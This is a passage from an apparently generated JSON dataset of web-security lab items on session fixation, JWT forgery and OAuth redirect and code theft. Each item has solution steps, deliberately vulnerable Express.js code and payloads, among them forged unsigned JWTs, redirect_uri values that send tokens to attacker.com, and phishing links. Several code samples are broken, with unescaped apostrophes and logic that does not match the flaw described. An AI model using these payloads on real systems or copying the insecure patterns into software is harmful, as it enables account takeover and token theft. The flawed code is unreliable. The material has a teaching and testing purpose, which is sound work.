      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to spider the app and discover that the session ID is passed as a URL parameter (/login?session=).",
        "Manually supply a predictable value for the session parameter during your own login and confirm it persists across requests.",
        "Send Carlos a crafted phishing link containing your chosen session ID and wait for the session to become valid.",
        "Once Carlos logs in, reuse the crafted session token to access /my-dashboard.",
        "Validate success by accessing the page and confirming Carlos's personalized content."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(require('cookie-parser')()); const sessions = {}; app.get('/login', (req, res) => { let session = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', session); res.send('Session initiated'); }); app.post('/authenticate', (req, res) => { const session = req.cookies.session; const { username } = req.body; if (username === 'carlos') { sessions[session] = username; res.send('Logged in'); } else { res.status(401).send('Invalid user'); } }); app.get('/my-dashboard', (req, res) => { const session = req.cookies.session; if (sessions[session] === 'carlos') { res.send('Carlos Dashboard Access'); } else { res.status(403).send('Access Denied'); } }); app.listen(5050);",
      "payloads": [
        "/login?session=attacker123",
        "Cookie: session=attacker123",
        "Injected phishing link: https://victimsite.com/login?session=attacker123"
      ]
    },
    {
      "Lab scenario": "JWT None Algorithm Bypass in Authentication Header",
      "Lab Description": "This application uses JWT for user authentication but does not properly validate the signature algorithm. If the token's 'alg' field is set to 'none', the server skips verification. To solve: craft a token with 'alg':'none' and 'username':'carlos' and access /account.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Intercept an existing Authorization Bearer token using Burp Suite.",
        "Modify the JWT header to set 'alg' to 'none' and remove the signature part.",
        "Set the payload to {\"username\":\"carlos\"} using any JWT generator.",
        "Send the forged token in the Authorization header to /account using Postman.",
        "Confirm successful login by accessing Carlos's account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.username === 'carlos') { res.send('Welcome back Carlos!'); } else { res.status(403).send('Access Denied'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(5051);",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\"}",
        "Unsigned JWT: [Base64(header)].[Base64(payload)]."
      ]
    },
    {
      "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
      "Lab Description": "This OAuth implementation allows arbitrary redirection of authorization codes to third-party sites through the vulnerable 'redirect_uri' parameter. The server fails to validate the host. To solve: capture Carlos's authorization code and exchange it for an access token.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to modify the 'redirect_uri' during your own OAuth login to confirm that external domains are accepted.",
        "Send Carlos a phishing link with the crafted redirect_uri pointing to your controlled server.",
        "Use a simple HTTP server to capture the redirected request and extract the authorization code.",
        "Exchange the intercepted code for an access token using Postman with a POST request to /oauth/token.",
        "Use the token to access /protected and confirm Carlos's user profile data is displayed."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'authcode-carlos'; res.redirect(`${redirectUri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'access-token-carlos' }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/protected', (req, res) => { const authHeader = req.headers.authorization; if (authHeader === 'Bearer access-token-carlos') { res.send('Carlos Protected Content'); } else { res.status(401).send('Unauthorized'); } }); app.listen(5052);",
      "payloads": [
        "https://vulnerable-app.com/authorize?redirect_uri=http://attacker.com",
        "POST /oauth/token {\"code\":\"authcode-carlos\"}",
        "Authorization: Bearer access-token-carlos"
      ]
    },
    {
      "Lab scenario": "JWT token signature confusion vulnerability in API authentication",
      "Lab Description": "This lab uses JSON Web Tokens to secure user sessions. The backend mistakenly trusts tokens signed with both HMAC and RSA keys depending on the 'alg' field, which makes it possible to craft a valid token using the public key as an HMAC secret. To solve: forge a token with admin privileges using algorithm confusion and access the /admin endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept the login JWT using Burp Suite and note the header specifies 'RS256' algorithm.",
        "Extract the public key from the application or its .well-known/jwks.json endpoint.",
        "Craft a new JWT header with 'alg' set to 'HS256' and use the public key as the HMAC secret to sign it.",
        "Modify the payload to {\"username\":\"carlos\",\"role\":\"admin\"} and submit the token via Postman to /admin.",
        "Verify admin-level access by confirming the /admin endpoint responds with sensitive data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') { res.send('Sensitive admin data for carlos'); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(6001);",
      "payloads": [
        "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
        "Signature: HMAC(publicKey, base64Url(header) + '.' + base64Url(payload))"
      ]
    },
    {
      "Lab scenario": "Session fixation via unvalidated 'session_id' in OAuth callback flow",
      "Lab Description": "This OAuth-enabled app accepts a 'session_id' from the user during the authorization flow, which it reuses to bind the session after token exchange without validation. To solve: inject a fixed session ID and access Carlos's authenticated session after his login completes.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to observe the 'session_id' parameter being passed in the OAuth callback flow.",
        "Manually alter the 'session_id' in the authorization request to a known value (e.g., 'attackersession').",
        "Send Carlos a phishing link that includes the 'session_id=attackersession' parameter.",
        "After Carlos authenticates, reuse the 'attackersession' cookie to access /profile as Carlos.",
        "Confirm compromise by seeing Carlos's profile data on the /profile page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const sessionId = req.query.session_id; const code = req.query.code; if (code === 'authcode-carlos') { res.cookie('session_id', sessionId); res.send('OAuth login successful'); } else { res.status(401).send('Invalid code'); } }); app.get('/profile', (req, res) => { if (req.cookies.session_id === 'attackersession') { res.send('Carlos profile data exposed'); } else { res.status(403).send('Access Denied'); } }); app.listen(6002);",
      "payloads": [
        "/oauth/callback?session_id=attackersession&code=authcode-carlos",
        "Cookie: session_id=attackersession",
        "Phishing link: https://target.com/oauth/authorize?session_id=attackersession"
      ]
    },
    {
      "Lab scenario": "Improper OAuth scope validation in REST API Authorization Flow",
      "Lab Description": "This lab uses OAuth to authorize API access. The backend trusts the client-provided scope without verifying it server-side, allowing privilege escalation by modifying the scope parameter. To solve: request an access token with elevated scope 'admin' and use it to access /admin/data.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth authorization request and locate the 'scope' parameter.",
        "Modify the 'scope' to include 'admin' before submitting the request.",
        "Exchange the authorization code for a token at /oauth/token using Postman.",
        "Use the new token to access /admin/data endpoint.",
        "Confirm the lab is solved when admin-level sensitive data is displayed."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.post('/oauth/token', (req, res) => { const { code, scope } = req.body; if (code === 'valid-auth-code') { res.json({ access_token: 'token-for-' + scope }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/admin/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-admin') { res.send('Admin level confidential data'); } else { res.status(403).send('Forbidden'); } }); app.listen(6003);",
      "payloads": [
        "scope=admin",
        "POST /oauth/token {\"code\":\"valid-auth-code\",\"scope\":\"admin\"}",
        "Authorization: Bearer token-for-admin"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in cookie-based login",
      "Lab Description": "The application assigns session IDs before authentication and does not regenerate them upon successful login. This allows an attacker to set a session ID, trick a victim into using it, and hijack the account after login. To solve: fix the session ID, log in as the victim using the same session ID, and access their private dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to observe the Set-Cookie header during unauthenticated navigation to /login.",
        "Manually fix the session ID by forcing the same cookie value before authentication.",
        "Trick Carlos into logging in via a phishing link that uses the predefined session ID.",
        "Reuse the same session ID cookie to access /dashboard after Carlos logs in.",
        "Verify the takeover by confirming the /dashboard page shows Carlos's private data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substr(2)); } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users.find(u => u.username === username && u.password === password)) { res.send('Logged in as ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { if (req.cookies.sessionid === 'fixedsessionid') { res.send('Welcome Carlos, your sensitive data is here.'); } else { res.status(403).send('Access denied.'); } }); app.listen(7001);",
      "payloads": [
        "Cookie: sessionid=fixedsessionid",
        "Phishing URL: http://target.com/login?sessionid=fixedsessionid",
        "Hijack Access: GET /dashboard with Cookie: sessionid=fixedsessionid"
      ]
    },
    {
      "Lab scenario": "JWT tampering due to missing signature verification",
      "Lab Description": "The application accepts JWT tokens for authentication but does not verify their signatures due to a misconfigured token parser. This allows an attacker to forge arbitrary tokens and impersonate other users. To solve: craft a JWT token with the payload for 'admin' access and submit it to /admin-panel.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Capture the login JWT token using Burp Suite.",
        "Notice the lack of signature validation by modifying the token payload and observing unchanged server behavior.",
        "Craft a new JWT token with payload: {\"user\":\"carlos\",\"role\":\"admin\"} and leave the signature empty.",
        "Send the forged token in the Authorization header to the /admin-panel endpoint.",
        "Confirm the lab is solved when admin data for Carlos is shown."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') { res.send('Admin panel for carlos'); } else { res.status(403).send('Access Denied'); } }); app.listen(7002);",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
        "Signature: (empty)"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow misconfiguration allows token interception",
      "Lab Description": "The app uses OAuth's implicit grant flow with tokens exposed in the URL fragment, which is accessible to malicious scripts due to the lack of proper CSP headers. To solve: steal the access token via a crafted JavaScript payload and use it to access /api/userinfo as Carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, observe the redirect URI contains the access token in the URL fragment.",
        "Inject a malicious JavaScript payload via the referer parameter in the OAuth request.",
        "Host a script that captures window.location.hash and exfiltrates the access token to your server.",
        "Replay the intercepted token to /api/userinfo using Postman.",
        "Confirm the lab is solved by retrieving Carlos's private profile from the endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'access-token-for-carlos'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.send('Private data for carlos'); } else { res.status(403).send('Access Denied'); } }); app.listen(7003);",
      "payloads": [
        "Malicious Redirect: http://attacker.com/capture#access_token=",
        "JavaScript Snippet: window.location.hash.split('=')[1]",
        "Authorization: Bearer access-token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion attack in token verification logic",
      "Lab Description": "The application uses JWT for authentication but incorrectly trusts the algorithm specified in the token header. This allows an attacker to switch from HMAC to 'none' algorithm and forge tokens. To solve: manipulate the JWT header to use 'none', craft a valid admin payload, and access the protected /admin route.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Burp Suite to intercept the login request and retrieve the issued JWT token.",
        "Modify the JWT header to set 'alg' to 'none' and observe if the backend accepts the unsigned token.",
        "Create a new token with payload {\"user\":\"carlos\",\"role\":\"admin\"} and leave the signature blank.",
        "Send the forged token in an Authorization: Bearer header to /admin.",
        "Access the admin dashboard and confirm the lab is solved by reading Carlos's sensitive data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const jwt = require('jsonwebtoken'); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin Carlos!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5000);",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
        "Signature: (empty)"
      ]
    },
    {
      "Lab scenario": "Session fixation via static session token in GraphQL mutation",
      "Lab Description": "The application uses GraphQL for authentication but assigns a session token before login that is not regenerated post-login. This allows an attacker to predefine a token, send it to the victim, and hijack their session once the victim logs in. To solve: fix a session token, hijack the user's session, and access the profile endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to monitor the GraphQL /graphql endpoint and note that the 'session' cookie is assigned on initial contact.",
        "Send a GraphQL mutation with your fixed session cookie and observe it persists after login.",
        "Send the fixed session link to Carlos and wait for him to log in.",
        "After Carlos authenticates, reuse the same fixed session cookie and access /graphql to query for { user { profile } }.",
        "Confirm that Carlos's profile data is retrieved using the fixed session token."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(require('express-graphql')({ schema: require('graphql').buildSchema('type Query { profile: String }'), rootValue: { profile: () => 'User: Carlos profile data' }, graphiql: true })); app.use((req, res, next) => { if (!req.cookies.session) res.cookie('session', 'static-session-id'); next(); }); app.listen(5001);",
      "payloads": [
        "Cookie: session=static-session-id",
        "GraphQL Query: { user { profile } }",
        "Phishing Link: http://target.com/graphql?session=static-session-id"
      ]
    },
    {
      "Lab scenario": "OAuth open redirect token theft in redirect_uri validation",
      "Lab Description": "The application uses OAuth authorization but fails to properly validate the redirect_uri parameter, allowing attackers to steal tokens via an open redirect. To solve: craft a malicious redirect_uri pointing to your controlled server, extract Carlos's token, and access /userinfo using it.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, intercept the OAuth authorization flow and note that redirect_uri is insufficiently validated.",
        "Modify the redirect_uri parameter to use your attacker-controlled domain.",
        "Deploy a malicious server to capture the token fragment via window.location.hash.",
        "Use Postman to send an Authorization header with the stolen token to /userinfo.",
        "Confirm the lab is solved when Carlos's personal user information is displayed."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.get('/oauth/authorize', (req, res) => { const token = 'carlos-oauth-token'; const redirectUri = req.query.redirect_uri; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Sensitive profile data for Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5002);",
      "payloads": [
        "redirect_uri=http://attacker.com/capture",
        "JavaScript: window.location.hash.split('=')[1]",
        "Authorization: Bearer carlos-oauth-token"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session IDs in REST login flow",
      "Lab Description": "The application issues session IDs before user authentication, and these tokens are not regenerated upon successful login. This lets an attacker pre-fixate a session token, send it to a victim, and hijack their authenticated session. To solve: pre-assign a session ID, trick the victim to log in with it, and access the /dashboard endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Using Burp Suite, intercept the GET /login request and observe the server sets a session cookie before login.",
        "Confirm that the session remains unchanged after successful login.",
        "Manually set the session cookie to a fixed value in Burp Repeater and send a phishing link to the victim.",
        "Once the victim logs in using the fixated session ID, reuse this same session cookie in your browser.",
        "Access the /dashboard endpoint and confirm successful access to the victim's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use((req, res, next) => { if (!req.cookies.sessionID) res.cookie('sessionID', 'sess-' + Date.now()); next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'qwerty') { res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { if (req.cookies.sessionID) res.send('Welcome to Carlos's Dashboard'); else res.status(401).send('Please login'); }); app.listen(4005);",
      "payloads": [
        "sessionID=sess-1713456700",
        "Login credentials: username=carlos&password=qwerty",
        "Reuse sessionID in subsequent requests"
      ]
    },
    {
      "Lab scenario": "JWT secret key disclosure via verbose error logging in token validation",
      "Lab Description": "The application uses a poorly configured JWT validation library that leaks internal errors to the client, exposing the secret signing key when token verification fails. To solve: submit a malformed token, extract the secret from the error response, craft a valid admin token, and access /admin-panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Postman, send a deliberately corrupted JWT token in the Authorization header and inspect the HTTP response.",
        "Note the verbose error revealing the secret key used for HMAC signature validation.",
        "Rebuild a valid JWT with payload {\"user\":\"carlos\",\"role\":\"admin\"} and sign it using the disclosed secret.",
        "Submit the signed token as a Bearer token in a request to /admin-panel.",
        "Confirm successful admin access when Carlos's admin dashboard is displayed."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'SuperSecretSigningKey'; app.get('/admin-panel', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') res.send('Welcome to Carlos's Admin Panel'); else res.status(403).send('Forbidden'); } catch (e) { res.status(500).send(`Error: ${e.message}`); } }); app.listen(4010);",
      "payloads": [
        "Malformed token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.payload",
        "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
        "{\"user\":\"carlos\",\"role\":\"admin\"} signed with SuperSecretSigningKey"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token leakage via referer header mismanagement",
      "Lab Description": "The application implements OAuth implicit flow but fails to clear the referer header after redirection, leaking the access token to third-party domains. To solve: intercept the Referer header after redirection to extract the victim's token, use it to access /user/settings.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, monitor HTTP requests during the OAuth implicit flow and note that the access token is appended to the redirect URL fragment.",
        "Deploy a controlled page with an embedded image or link pointing to the vulnerable redirect endpoint.",
        "Force the victim to click this crafted link so their access token is exposed via the Referer header to your server.",
        "Extract the token from your server logs and use Postman to send it as an Authorization Bearer token to /user/settings.",
        "Confirm access to Carlos's settings to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth/authorize', (req, res) => { const token = 'access-token-for-carlos'; res.redirect(`${req.query.redirect_uri}#access_token=${token}`); }); app.get('/user/settings', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') res.send('Carlos's User Settings'); else res.status(401).send('Unauthorized'); }); app.listen(4020);",
      "payloads": [
        "Phishing link: http://vulnerable-app.com/auth/authorize?redirect_uri=http://attacker.com/callback",
        "Referer Header: http://attacker.com/callback#access_token=access-token-for-carlos",
        "Authorization: Bearer access-token-for-carlos"
      ]
    },
    {
      "Lab scenario": "Session mismanagement via insecure logout endpoint",
      "Lab Description": "The application's logout function fails to invalidate session cookies on the server, allowing attackers to reuse a hijacked token. The application continues to trust old session cookies even after the user logs out. To solve: capture the session cookie pre-logout and reuse it to access /account/profile after the user logs out.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "With Burp Suite running, intercept your own login request and capture the Set-Cookie header for the session.",
        "Log out from the application and note the server does not invalidate the cookie on logout.",
        "Replay the original session cookie manually via Burp Repeater to confirm the session is still active.",
        "Inject the session cookie into a browser's cookie store and refresh /account/profile.",
        "Verify that the page loads with authenticated user content, solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.post('/login', (req, res) => { const sessionId = 'sess_' + Math.random().toString(36).substring(2); sessions[sessionId] = { user: 'carlos' }; res.cookie('session', sessionId); res.send('Logged in'); }); app.post('/logout', (req, res) => { res.send('Logged out'); }); app.get('/account/profile', (req, res) => { const sessionId = req.cookies.session; if (sessions[sessionId]) { res.send(`User profile for ${sessions[sessionId].user}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4500);",
      "payloads": [
        "Cookie: session=sess_example_hijack_value",
        "/account/profile endpoint access with the reused cookie"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion vulnerability in token verification logic",
      "Lab Description": "The application uses a JWT library that allows switching between asymmetric (RS256) and symmetric (HS256) algorithms without proper validation, enabling attackers to forge tokens with HS256 using the public key as the secret. To solve: download the public key, sign a malicious admin token using HS256, and access /admin/dashboard.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to observe the JWT token in the Authorization header during login and note the alg parameter set to RS256.",
        "Download the server's exposed public key from /public.pem.",
        "Craft a new JWT with {\"user\":\"carlos\",\"role\":\"admin\"} and change the alg field to HS256.",
        "Sign the new token using the public key as the secret and inject it into the Authorization header.",
        "Send the request to /admin/dashboard and verify administrative access to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('public.pem'); app.use(require('body-parser').json()); app.get('/admin/dashboard', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.role === 'admin') res.send('Welcome Admin Carlos!'); else res.status(403).send('Access denied'); } catch (err) { res.status(500).send(err.message); } }); app.listen(4600);",
      "payloads": [
        "JWT Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
        "JWT Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
        "Secret Key: public.pem contents used as HMAC secret"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leading to authorization code reuse",
      "Lab Description": "The application uses OAuth 2.0 Authorization Code flow but does not invalidate the authorization code after the first use, allowing reuse for session hijacking. The application [accepts stale codes]. To solve: intercept the authorization code, reuse it for a second login attempt to access /user/dashboard as Carlos.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Using Burp Suite, intercept the OAuth authorization process and capture the authorization code parameter from the redirect.",
        "Allow the victim to use the code once and confirm the login succeeds.",
        "Reuse the same authorization code in a second crafted POST /oauth/token request.",
        "Exchange the code for a valid access token, despite it being reused.",
        "Use the token to access /user/dashboard and confirm the lab is solved."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/oauth/authorize', (req, res) => { const code = 'authcode1234'; res.redirect(`${req.query.redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode1234') { res.json({ access_token: 'reusable-token' }); } else { res.status(400).send('Invalid code'); } }); app.get('/user/dashboard', (req, res) => { if (req.headers.authorization === 'Bearer reusable-token') { res.send('Carlos's Dashboard Loaded'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4700);",
      "payloads": [
        "Authorization Code: authcode1234",
        "Access Token: Bearer reusable-token",
        "Endpoint: /user/dashboard"
      ]
    },
    {
      "Lab scenario": "Session Fixation Attack in Cookie Assignment",
      "Lab Description": "The application is vulnerable to session fixation because it accepts and trusts user-provided session IDs without regenerating them upon login. The application assigns the session ID based on the `session` cookie and never invalidates it post-authentication. To solve: set a known session ID, perform a login as yourself, and then reuse the fixed session ID to hijack Carlos's session.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a GET /login page request and manually inject a crafted `session` cookie like `session=attacker-session`.",
        "Submit valid login credentials with the crafted session ID still set and observe that the server accepts it unchanged.",
        "Log out and attempt to reuse the same `session` value `attacker-session` in a new request to /my-account.",
        "Send a credential stuffing attack using the same `session` cookie for Carlos's credentials.",
        "Verify that the server authenticates the session and grants access to Carlos's /my-account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'supersecret' }; const sessions = {}; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session]; if (username) { res.send(`Welcome ${username}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4100);",
      "payloads": [
        "Cookie: session=attacker-session",
        "POST body: username=carlos&password=supersecret",
        "GET /my-account with Cookie: session=attacker-session"
      ]
    },
    {
      "Lab scenario": "JWT none algorithm attack in Token Validation",
      "Lab Description": "The application's JWT implementation does not properly enforce the algorithm check and accepts tokens signed with the `none` algorithm, bypassing signature verification. The application uses this token to control user access levels. To solve: modify the token to use `alg=none` and set `admin=true` to gain administrative privileges.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Capture a legitimate JWT token using Burp Suite from the Authorization header after logging in.",
        "Decode the JWT using jwt.io and modify the header to `{ \"alg\": \"none\" }`.",
        "Edit the payload to `{ \"username\": \"carlos\", \"admin\": true }`.",
        "Remove the signature and send the token in an Authorization header as a Bearer token.",
        "Access /admin-panel and confirm you have administrative privileges, solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'super-secret', { algorithms: ['HS256', 'none'] }); if (decoded.admin) res.send('Admin Access Granted'); else res.status(403).send('Access Denied'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4200);",
      "payloads": [
        "JWT Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "JWT Payload: {\"username\":\"carlos\",\"admin\":true}",
        "Final JWT: eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ."
      ]
    },
    {
      "Lab scenario": "OAuth Token Misuse in Redirect URI Trust",
      "Lab Description": "The OAuth server in this lab improperly trusts wildcards in redirect URIs, allowing attackers to exfiltrate authorization codes to an external malicious domain. The application [uses a poorly validated wildcard match]. To solve: exploit the redirect URI to leak Carlos's code and reuse it to obtain his access token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, initiate an OAuth login and note the redirect_uri parameter allows wildcards like `https://yourdomain.com/*`.",
        "Craft a malicious URL replacing the subpath with your controlled server `https://yourdomain.com.attacker.com/callback`.",
        "Send the link to Carlos (assume social engineering or XSS) and wait for him to authorize the app.",
        "Capture the leaked code in your server logs and exchange it for an access token at `/oauth/token`.",
        "Use the token to call `/user/dashboard` as Carlos and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const validCodes = {}; app.get('/oauth/authorize', (req, res) => { const code = 'authcode-carlos'; validCodes[code] = req.query.redirect_uri; res.redirect(`${req.query.redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (validCodes[code]) { res.json({ access_token: 'token-for-carlos' }); } else { res.status(400).send('Invalid code'); } }); app.get('/user/dashboard', (req, res) => { if (req.headers.authorization === 'Bearer token-for-carlos') { res.send('Carlos Dashboard Loaded'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4300);",
      "payloads": [
        "Malicious Redirect URI: https://yourdomain.com.attacker.com/callback",
        "Intercepted Auth Code: authcode-carlos",
        "Access Token: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation in login redirect flow",
      "Lab Description": "The login flow does not regenerate session tokens upon authentication, allowing an attacker to fixate a session ID for a victim. The application fails to invalidate existing session tokens during login. To solve: hijack Carlos's session after login using a fixed session ID.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a GET /login request and inspect the Set-Cookie header for session ID",
        "Inject the fixed session ID into the victim's browser via phishing or stored XSS in a comment section",
        "Wait for Carlos to log in using the pre-set session ID",
        "Access the account page using the same session ID to confirm session hijacking",
        "Verify by visiting /my-account with the stolen session cookie"
      ],
      "Vulnerability name": "Authentication",
